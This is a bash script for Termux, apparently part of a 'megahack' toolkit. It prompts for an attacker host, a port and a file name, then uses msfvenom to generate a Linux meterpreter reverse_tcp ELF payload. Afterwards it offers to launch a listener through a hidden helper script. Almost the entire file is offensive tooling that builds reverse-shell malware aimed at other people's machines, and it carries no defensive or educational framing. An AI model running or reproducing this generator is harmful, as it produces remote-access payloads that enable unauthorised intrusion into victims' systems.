#!/data/data/com.termux/files/usr/bin/bash
clear
cd $HOME/megahack
figlet LINUX | lolcat -t
figlet PAYLOADS | lolcat -t
echo " " 
tput setaf 1; echo " LHOST "
read lhost
echo " "
tput setaf 2; echo " LPORT "
read lport
echo " "
tput setaf 3; echo " OUTPUT NAME"
read out
echo " "
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > $HOME/megahack/output/linux/"$out".elf && tput setaf 2; echo " PAYLOAD SUCCESSFULLY GENERATED"
tput setaf 1; echo " PRESS INTER TO CONTINUE"
read nov
clear
figlet LINUX | lolcat -t
figlet PAYLOADS | lolcat -t
echo " " 
echo " "
tput setaf 1; echo "   [1] Start Listner"
echo " " 
tput setaf 2; echo "   [2] Exit"
echo " "
read task
if [ "2" = "$task" ]
then
	cd $HOME/megahack && bash megahack
else
	cd $HOME/megahack/.l/.linux && bash .1.sh
fi
